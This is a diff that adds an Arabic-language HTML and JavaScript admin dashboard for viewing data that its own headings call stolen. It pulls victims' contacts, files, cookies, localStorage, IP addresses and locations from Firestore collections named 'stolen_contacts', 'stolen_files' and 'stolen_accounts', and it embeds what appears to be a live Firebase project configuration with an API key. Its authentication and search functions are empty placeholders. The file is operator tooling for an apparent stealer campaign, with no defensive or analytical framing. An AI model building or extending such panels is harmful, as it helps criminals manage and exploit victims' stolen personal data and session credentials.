@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - البيانات المستلمة</title>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .dashboard-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #2c3e50, #34495e);
+            color: white;
+            padding: 25px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 600;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 25px;
+            background: #f8f9fa;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+            text-align: center;
+            border-left: 4px solid #3498db;
+        }
+
+        .stat-card.contacts { border-left-color: #e74c3c; }
+        .stat-card.files { border-left-color: #f39c12; }
+        .stat-card.accounts { border-left-color: #9b59b6; }
+        .stat-card.sessions { border-left-color: #1abc9c; }
+
+        .stat-number {
+            font-size: 32px;
+            font-weight: bold;
+            color: #2c3e50;
+            margin: 10px 0;
+        }
+
+        .stat-label {
+            color: #7f8c8d;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .data-sections {
+            padding: 25px;
+        }
+
+        .section {
+            background: white;
+            margin-bottom: 25px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+
+        .section-header {
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+            padding: 18px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .section-header h2 {
+            font-size: 20px;
+            font-weight: 500;
+        }
+
+        .section-content {
+            padding: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .data-item {
+            background: #f8f9fa;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            border-left: 3px solid #3498db;
+        }
+
+        .data-item.contact { border-left-color: #e74c3c; }
+        .data-item.file { border-left-color: #f39c12; }
+        .data-item.account { border-left-color: #9b59b6; }
+
+        .data-item-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .data-item-title {
+            font-weight: 600;
+            color: #2c3e50;
+        }
+
+        .data-item-meta {
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+
+        .data-item-content {
+            color: #34495e;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .timestamp {
+            font-size: 11px;
+            color: #95a5a6;
+            text-align: right;
+            margin-top: 5px;
+        }
+
+        .filters {
+            background: #f8f9fa;
+            padding: 15px 25px;
+            border-bottom: 1px solid #e9ecef;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .filter-select {
+            padding: 8px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background: white;
+            font-size: 14px;
+        }
+
+        .search-box {
+            flex: 1;
+            padding: 8px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+
+        .refresh-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #7f8c8d;
+        }
+
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #bdc3c7;
+            font-style: italic;
+        }
+
+        /* تخصيص سكرول بار */
+        .section-content::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .section-content::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 3px;
+        }
+
+        .section-content::-webkit-scrollbar-thumb {
+            background: #c1c1c1;
+            border-radius: 3px;
+        }
+
+        .section-content::-webkit-scrollbar-thumb:hover {
+            background: #a8a8a8;
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard-container">
+        <!-- الهيدر -->
+        <div class="header">
+            <h1>📊 لوحة تحكم البيانات المستلمة</h1>
+            <div class="header-info">
+                <div id="current-time" style="font-size: 14px; opacity: 0.9;"></div>
+            </div>
+        </div>
+
+        <!-- الفلاتر والبحث -->
+        <div class="filters">
+            <select class="filter-select" id="time-filter">
+                <option value="all">جميع البيانات</option>
+                <option value="today">اليوم</option>
+                <option value="week">أسبوع</option>
+                <option value="month">شهر</option>
+            </select>
+            <input type="text" class="search-box" id="search-input" placeholder="🔍 ابحث في البيانات...">
+            <button class="refresh-btn" onclick="loadAllData()">🔄 تحديث</button>
+        </div>
+
+        <!-- الإحصائيات -->
+        <div class="stats-grid">
+            <div class="stat-card contacts">
+                <div class="stat-label">جهات الاتصال</div>
+                <div class="stat-number" id="contacts-count">0</div>
+                <div class="stat-subtitle">جهة اتصال</div>
+            </div>
+            <div class="stat-card files">
+                <div class="stat-label">الملفات والصور</div>
+                <div class="stat-number" id="files-count">0</div>
+                <div class="stat-subtitle">ملف</div>
+            </div>
+            <div class="stat-card accounts">
+                <div class="stat-label">بيانات الحسابات</div>
+                <div class="stat-number" id="accounts-count">0</div>
+                <div class="stat-subtitle">حساب</div>
+            </div>
+            <div class="stat-card sessions">
+                <div class="stat-label">الجلسات النشطة</div>
+                <div class="stat-number" id="sessions-count">0</div>
+                <div class="stat-subtitle">جلسة</div>
+            </div>
+        </div>
+
+        <!-- أقسام البيانات -->
+        <div class="data-sections">
+            <!-- قسم جهات الاتصال -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>👥 جهات الاتصال المسروقة</h2>
+                    <span class="stat-badge" id="contacts-badge">0</span>
+                </div>
+                <div class="section-content" id="contacts-list">
+                    <div class="loading">⏳ جاري تحميل جهات الاتصال...</div>
+                </div>
+            </div>
+
+            <!-- قسم الملفات -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>📁 الملفات والصور المسروقة</h2>
+                    <span class="stat-badge" id="files-badge">0</span>
+                </div>
+                <div class="section-content" id="files-list">
+                    <div class="loading">⏳ جاري تحميل الملفات...</div>
+                </div>
+            </div>
+
+            <!-- قسم بيانات الحسابات -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>🔐 بيانات الحسابات المسروقة</h2>
+                    <span class="stat-badge" id="accounts-badge">0</span>
+                </div>
+                <div class="section-content" id="accounts-list">
+                    <div class="loading">⏳ جاري تحميل بيانات الحسابات...</div>
+                </div>
+            </div>
+
+            <!-- قسم الجلسات -->
+            <div class="section">
+                <div class="section-header">
+                    <h2>🌐 الجلسات النشطة</h2>
+                    <span class="stat-badge" id="sessions-badge">0</span>
+                </div>
+                <div class="section-content" id="sessions-list">
+                    <div class="loading">⏳ جاري تحميل الجلسات...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== إعدادات Firebase ==========
+        const firebaseConfig = {
+            apiKey: "AIzaSyB7uWrWJ1v_o3fqx0442wIkrAfTnPn84Mo",
+            authDomain: "unseen-93dd8.firebaseapp.com",
+            projectId: "unseen-93dd8",
+            storageBucket: "unseen-93dd8.firebasestorage.app",
+            messagingSenderId: "142670337449",
+            appId: "1:142670337449:web:f41e9b5ebbb433378060b8",
+            measurementId: "G-SPL7YN9LZ1"
+        };
+
+        // تهيئة Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const auth = firebase.auth();
+        const storage = firebase.storage();
+
+        // ========== متغيرات عامة ==========
+        let allContacts = [];
+        let allFiles = [];
+        let allAccounts = [];
+        let allSessions = [];
+
+        // ========== دوال تحميل البيانات ==========
+        async function loadAllData() {
+            try {
+                await Promise.all([
+                    loadContacts(),
+                    loadFiles(), 
+                    loadAccounts(),
+                    loadSessions()
+                ]);
+                updateStats();
+                updateTime();
+            } catch (error) {
+                console.error('Error loading data:', error);
+                showError('فشل في تحميل البيانات');
+            }
+        }
+
+        // تحميل جهات الاتصال
+        async function loadContacts() {
+            const contactsList = document.getElementById('contacts-list');
+            contactsList.innerHTML = '<div class="loading">⏳ جاري تحميل جهات الاتصال...</div>';
+
+            try {
+                const snapshot = await db.collection('stolen_contacts')
+                    .orderBy('timestamp', 'desc')
+                    .limit(50)
+                    .get();
+
+                allContacts = [];
+                contactsList.innerHTML = '';
+
+                if (snapshot.empty) {
+                    contactsList.innerHTML = '<div class="no-data">لا توجد جهات اتصال مسروقة</div>';
+                    return;
+                }
+
+                snapshot.forEach(doc => {
+                    const contact = doc.data();
+                    allContacts.push(contact);
+                    
+                    const contactElement = `
+                        <div class="data-item contact">
+                            <div class="data-item-header">
+                                <div class="data-item-title">${contact.name || 'غير معروف'}</div>
+                                <div class="data-item-meta">${formatPhone(contact.phone)}</div>
+                            </div>
+                            <div class="data-item-content">
+                                ${contact.email ? `📧 ${contact.email}<br>` : ''}
+                                ${contact.address ? `📍 ${contact.address}` : ''}
+                            </div>
+                            <div class="timestamp">
+                                ${formatTimestamp(contact.timestamp)}
+                            </div>
+                        </div>
+                    `;
+                    contactsList.innerHTML += contactElement;
+                });
+
+            } catch (error) {
+                contactsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل جهات الاتصال</div>';
+            }
+        }
+
+        // تحميل الملفات
+        async function loadFiles() {
+            const filesList = document.getElementById('files-list');
+            filesList.innerHTML = '<div class="loading">⏳ جاري تحميل الملفات...</div>';
+
+            try {
+                const snapshot = await db.collection('stolen_files')
+                    .orderBy('timestamp', 'desc')
+                    .limit(30)
+                    .get();
+
+                allFiles = [];
+                filesList.innerHTML = '';
+
+                if (snapshot.empty) {
+                    filesList.innerHTML = '<div class="no-data">لا توجد ملفات مسروقة</div>';
+                    return;
+                }
+
+                snapshot.forEach(doc => {
+                    const file = doc.data();
+                    allFiles.push(file);
+                    
+                    const fileElement = `
+                        <div class="data-item file">
+                            <div class="data-item-header">
+                                <div class="data-item-title">${file.filename || 'غير معروف'}</div>
+                                <div class="data-item-meta">${formatFileSize(file.size)}</div>
+                            </div>
+                            <div class="data-item-content">
+                                النوع: ${file.type || 'غير معروف'}<br>
+                                ${file.data ? `الحجم: ${file.data.length} بايت` : ''}
+                            </div>
+                            <div class="timestamp">
+                                ${formatTimestamp(file.timestamp)}
+                            </div>
+                        </div>
+                    `;
+                    filesList.innerHTML += fileElement;
+                });
+
+            } catch (error) {
+                filesList.innerHTML = '<div class="no-data">❌ خطأ في تحميل الملفات</div>';
+            }
+        }
+
+        // تحميل بيانات الحسابات
+        async function loadAccounts() {
+            const accountsList = document.getElementById('accounts-list');
+            accountsList.innerHTML = '<div class="loading">⏳ جاري تحميل بيانات الحسابات...</div>';
+
+            try {
+                const snapshot = await db.collection('stolen_accounts')
+                    .orderBy('timestamp', 'desc')
+                    .limit(20)
+                    .get();
+
+                allAccounts = [];
+                accountsList.innerHTML = '';
+
+                if (snapshot.empty) {
+                    accountsList.innerHTML = '<div class="no-data">لا توجد بيانات حسابات مسروقة</div>';
+                    return;
+                }
+
+                snapshot.forEach(doc => {
+                    const account = doc.data();
+                    allAccounts.push(account);
+                    
+                    const accountElement = `
+                        <div class="data-item account">
+                            <div class="data-item-header">
+                                <div class="data-item-title">${account.userAgent?.substring(0, 50) || 'جهاز غير معروف'}</div>
+                                <div class="data-item-meta">${account.locationInfo?.hostname || 'غير معروف'}</div>
+                            </div>
+                            <div class="data-item-content">
+                                ${account.cookies ? `🍪 ${account.cookies.length} كوكيز<br>` : ''}
+                                ${account.localStorage ? `💾 ${Object.keys(account.localStorage).length} عنصر<br>` : ''}
+                                ${account.screenInfo ? `📱 ${account.screenInfo.width}x${account.screenInfo.height}` : ''}
+                            </div>
+                            <div class="timestamp">
+                                ${formatTimestamp(account.timestamp)}
+                            </div>
+                        </div>
+                    `;
+                    accountsList.innerHTML += accountElement;
+                });
+
+            } catch (error) {
+                accountsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل بيانات الحسابات</div>';
+            }
+        }
+
+        // تحميل الجلسات
+        async function loadSessions() {
+            const sessionsList = document.getElementById('sessions-list');
+            sessionsList.innerHTML = '<div class="loading">⏳ جاري تحميل الجلسات...</div>';
+
+            try {
+                const snapshot = await db.collection('active_sessions')
+                    .orderBy('lastActive', 'desc')
+                    .limit(15)
+                    .get();
+
+                allSessions = [];
+                sessionsList.innerHTML = '';
+
+                if (snapshot.empty) {
+                    sessionsList.innerHTML = '<div class="no-data">لا توجد جلسات نشطة</div>';
+                    return;
+                }
+
+                snapshot.forEach(doc => {
+                    const session = doc.data();
+                    allSessions.push(session);
+                    
+                    const sessionElement = `
+                        <div class="data-item">
+                            <div class="data-item-header">
+                                <div class="data-item-title">${session.ipAddress || 'غير معروف'}</div>
+                                <div class="data-item-meta">${session.device || 'جهاز غير معروف'}</div>
+                            </div>
+                            <div class="data-item-content">
+                                ${session.browser || 'متصفح غير معروف'}<br>
+                                ${session.location || 'موقع غير معروف'}
+                            </div>
+                            <div class="timestamp">
+                                آخر نشاط: ${formatTimestamp(session.lastActive)}
+                            </div>
+                        </div>
+                    `;
+                    sessionsList.innerHTML += sessionElement;
+                });
+
+            } catch (error) {
+                sessionsList.innerHTML = '<div class="no-data">❌ خطأ في تحميل الجلسات</div>';
+            }
+        }
+
+        // ========== دوال مساعدة ==========
+        function updateStats() {
+            document.getElementById('contacts-count').textContent = allContacts.length;
+            document.getElementById('files-count').textContent = allFiles.length;
+            document.getElementById('accounts-count').textContent = allAccounts.length;
+            document.getElementById('sessions-count').textContent = allSessions.length;
+            
+            document.getElementById('contacts-badge').textContent = allContacts.length;
+            document.getElementById('files-badge').textContent = allFiles.length;
+            document.getElementById('accounts-badge').textContent = allAccounts.length;
+            document.getElementById('sessions-badge').textContent = allSessions.length;
+        }
+
+        function formatPhone(phone) {
+            if (!phone) return 'لا يوجد رقم';
+            return phone.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3');
+        }
+
+        function formatFileSize(bytes) {
+            if (!bytes) return 'غير معروف';
+            const sizes = ['بايت', 'ك.بايت', 'م.بايت', 'ج.بايت'];
+            const i = Math.floor(Math.log(bytes) / Math.log(1024));
+            return Math.round(bytes / Math.pow(1024, i)) + ' ' + sizes[i];
+        }
+
+        function formatTimestamp(timestamp) {
+            if (!timestamp) return 'غير معروف';
+            const date = timestamp.toDate();
+            return date.toLocaleString('ar-EG');
+        }
+
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('current-time').textContent = 
+                `آخر تحديث: ${now.toLocaleString('ar-EG')}`;
+        }
+
+        function showError(message) {
+            alert(`❌ ${message}`);
+        }
+
+        // ========== البحث والتصفية ==========
+        document.getElementById('search-input').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            filterData(searchTerm);
+        });
+
+        document.getElementById('time-filter').addEventListener('change', function(e) {
+            filterByTime(e.target.value);
+        });
+
+        function filterData(searchTerm) {
+            // تطبيق البحث على جميع البيانات
+            // ... كود التصفية ...
+        }
+
+        function filterByTime(timeRange) {
+            // تطبيق التصفية الزمنية
+            // ... كود التصفية الزمنية ...
+        }
+
+        // ========== التهيئة ==========
+        document.addEventListener('DOMContentLoaded', function() {
+            // تحميل البيانات الأولي
+            loadAllData();
+            
+            // تحديث الوقت كل دقيقة
+            setInterval(updateTime, 60000);
+            
+            // تحديث تلقائي للبيانات كل 30 ثانية
+            setInterval(loadAllData, 30000);
+        });
+
+        // ========== مصادقة المسؤول ==========
+        async function authenticateAdmin() {
+            try {
+                // كود المصادقة
+                // ... مصادقة المسؤول ...
+            } catch (error) {
+                console.error('Authentication failed:', error);
+                window.location.href = 'login.html';
+            }
+        }
+
+        // تحقق من المصادقة عند التحميل
+        authenticateAdmin();
+
+    </script>
+</body>
+</html>
